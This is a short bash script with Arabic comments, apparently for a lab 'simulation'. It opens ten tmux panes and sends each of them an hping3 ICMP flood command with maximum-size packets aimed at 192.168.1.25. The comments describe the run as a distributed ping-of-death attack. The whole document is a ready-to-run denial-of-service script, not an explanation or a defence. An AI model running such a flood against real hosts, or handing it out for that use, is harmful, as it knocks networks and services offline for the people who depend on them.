#!/bin/bash

# اسم الجلسة المخصصة لـ Ping of Death
SESSION_NAME="pod_ddos_simulation"

# 1. إنشاء جلسة tmux جديدة في الخلفية
tmux new-session -d -s $SESSION_NAME

# 2. إنشاء 9 تقسيمات إضافية ليصبح المجموع 10 أجزاء
for i in {1..9}
do
    tmux split-window -t $SESSION_NAME
    tmux select-layout -t $SESSION_NAME tiled
done

# 3. إرسال أمر الهجوم إلى كل جزء (Pane)
# لاحظ أننا نستخدم 65495 وهو الحد الأقصى الآمن للأداة
for pane in $(tmux list-panes -t $SESSION_NAME -F '#{pane_id}')
do
    tmux send-keys -t "$pane" "sudo hping3 -1 --flood -d 65495 -w 65495 192.168.1.25" C-m
done

# 4. الدخول إلى الجلسة لرؤية الهجوم الموزع
tmux attach-session -t $SESSION_NAME
